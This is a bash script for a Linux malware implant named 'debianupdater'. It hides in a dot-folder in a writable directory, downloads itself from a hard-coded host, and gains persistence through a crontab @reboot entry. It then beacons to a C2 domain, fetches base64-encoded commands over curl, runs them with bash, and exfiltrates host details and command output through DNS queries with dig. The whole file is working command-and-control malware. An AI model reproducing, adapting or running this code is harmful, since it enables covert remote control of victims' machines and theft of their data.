#!/bin/bash

function changeDnsServer {
	sed -i "s/$DNS/$1/g" settings.ini
	$DNS=$1
	echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] DNS Updated Successfully" >> "$LOGFILE"
}

function changeC2Domain {
	sed -i "s/$C2/$1/g" settings.ini
	$C2=$1
	echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] C2 Updated Successfully" >> "$LOGFILE"
}

function changeHostServer {
	sed -i "s/$HOST/$1/g" settings.ini
	$HOST=$1
	echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Host Server Updated Successfully" >> "$LOGFILE"
}

function updateSetting {
	echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Updating setting.ini" >> "$LOGFILE"
	CHANGE=$(echo $COMMAND | awk '{print $2}')
	case "$CHANGE" in
		DNSServer)
			NewDNSIP=$(echo $COMMAND | awk '{print $3}')
			echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Updating DNS Server to: $NewDNSIP" >> "$LOGFILE"
			changeDnsServer $NewDNSIP
			;;
		C2Domain)
			NewC2Domain=$(echo $COMMAND | awk '{print $3}')
			echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Updating C2 Server to: $NewC2Domain" >> "$LOGFILE"
			changeC2Domain $NewC2Domain
			;;
		HostServer)
			NewHostIP=$(echo $COMMAND | awk '{print $3}')
			echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Updating Host Server to: $NewHostIP" >> "$LOGFILE"
			changeHostServer $NewHostIP
			;;
		*)
			echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [-] Change: $CHANGE not understood" >> "$LOGFILE"
			exit 1
			;;
	esac
	}

function runCommand {
	echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Executing: $EXEC" >> "$LOGFILE"
	OUTPUT=$(/bin/bash -c "$EXEC")
	if [[ $? == 0 ]]
	then
		echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Output: $OUTPUT" >> "$LOGFILE"
		sendEncodedOutput
	else
		echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [-] Error executing command." >> "$LOGFILE"
	fi
}

function sendEncodedOutput {
	ENCODEDOUT=$(echo -n $OUTPUT | base64 -w0)
	echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Sending output in b64: $ENCODEDOUT" >> "$LOGFILE"
	for i in $(echo $ENCODEDOUT | fold -w15);
	do
		echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] DNSRequest done: $i.$C2" >> "$LOGFILE"
		dig @$DNS "$i.$C2" &> /dev/null
	done
	echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Output sent" >> "$LOGFILE"
}


function getCommand {
	COMMAND=$(curl -s http://$C2 --resolve $C2:80:$IPC2 | base64 -d)
	if [[ $? == 0 ]]
	then
		echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Command received by C2: $COMMAND" >> "$LOGFILE"
	else
		echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [-] Error getting command." >> "$LOGFILE"
	fi
}

function terminateService {
	echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Shutting down process... " >> "$LOGFILE"
	exit 0
}

function initProcess {
	echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Init in $FOLDER" >> "$LOGFILE"
	HOSTNAME=$(hostname)
	KERNEL=$(uname -v)
	MSG="Running as $USER in $HOSTNAME - $KERNEL"
	echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] $MSG" >> "$LOGFILE"
	for i in $(echo $MSG | base64 | fold -w15);
	do
		echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] DNSRequest done: $i.$C2" >> "$LOGFILE"
		dig @$DNS "$i.$C2" &> /dev/null
	done
	echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Init msg sent" >> "$LOGFILE"

}

function initialConfig {
	echo "W1NFVFRJTkdTXQpETlM9IjE1LjIzNi4yMTEuMTgzIgpDMj0ibm90bWFsd2FyZS5kZWJpYW51cGRhdGUuY29tIgpIT1NUPSIxNS4yMzYuMjA1LjE5MiIKTE9HRklMRT0iL3RtcC9kYXRhLmxvZyIK" | base64 -d >> $FOLDER/.T29wcyEK/settings.ini
	echo "FOLDER=\"$FOLDER\"" >> $FOLDER/.T29wcyEK/settings.ini
	HOST=$(cat $FOLDER/.T29wcyEK/settings.ini | grep HOST | cut -d'"' -f2)
	wget http://$HOST/debianupdater.sh -O $FOLDER/.T29wcyEK/debianupdater.sh &> /dev/null
}

function getPersistence {
	echo "@reboot /bin/bash $FOLDER/.T29wcyEK/debianupdater.sh" | crontab
	if [[ $? == 0 ]]
	then
		echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Persistence achieved" >> "$LOGFILE"
	else
		echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [-] Error getting persistence" >> "$LOGFILE"
	fi
}

function findwritablefolders {
	WRITABLE=$(find / -writable -type d 2>/dev/null | grep -ve "denied" -e "/tmp" -e "/dev" -e "/run" -e "/proc" -e "/sys" -e "/lock" | sort -r)
	for i in $(echo $WRITABLE);
	do
		touch "$i/test"
		if [[ $? == 0 ]]
        	then
        	        FOLDER=$i
			break
        	fi
	done
}


if [[ $(find / -name ".T29wcyEK" -type d 2>/dev/null | wc -l) == 0 ]]
then
	findwritablefolders
	if [ -z "$FOLDER" ];
	then
		exit 1
	fi
	if [ ! -d "$FOLDER/.T29wcyEK/" ];
	then	
		mkdir -p $FOLDER/.T29wcyEK/
		initialConfig
		LOGFILE=$(cat $FOLDER/.T29wcyEK/settings.ini | grep LOGFILE | cut -d'"' -f2)
		getPersistence
	fi
else
	FOLDER=$(cat $(find / -name ".T29wcyEK" -type d 2>/dev/null)/settings.ini | grep FOLDER | cut -d'"' -f2)
	LOGFILE=$(cat $FOLDER/.T29wcyEK/settings.ini | grep LOGFILE | cut -d'"' -f2)
	echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Found debianupdater installation in $FOLDER" >> "$LOGFILE"
	if [[ $? == 1 ]]
	then
		exit 1
	fi
fi

USER=$(whoami)
RUN=1
DNS=$(cat $FOLDER/.T29wcyEK/settings.ini | grep DNS | cut -d'"' -f2)
echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] DNS Server set up to: $DNS" >> "$LOGFILE"
HOST=$(cat $FOLDER/.T29wcyEK/settings.ini | grep HOST | cut -d'"' -f2)
echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Malware Host set up to: $HOST" >> "$LOGFILE"
C2=$(cat $FOLDER/.T29wcyEK/settings.ini | grep C2 | cut -d'"' -f2)
echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] C2 Server set up to: $C2" >> "$LOGFILE"
IPC2=$(dig @$DNS $C2 +answer +short)
echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] C2 server IP resolve to: $IPC2" >> "$LOGFILE"
initProcess


while [[ $RUN == 1 ]]
do
	getCommand
	ACTION=$(echo $COMMAND | awk '{print $1}')
	echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Action received: $ACTION" >> "$LOGFILE"
	case "$ACTION" in
		standby)
			echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [+] Standby" >> "$LOGFILE"
			sleep 600
			#exit 0
			;;
		exec)
			EXEC=$(echo $COMMAND | cut -d' ' -f2-)
			runCommand
			;;
		update)
			updateSetting
			;;
		exit)
			terminateService
			;;
		*)
			echo "$(date +"%b %d %H:%M:%S") $USER debianupdater: [-] Action: $ACTION not understood" >> "$LOGFILE"
			#exit 1
			;;
		esac
	sleep 600
done
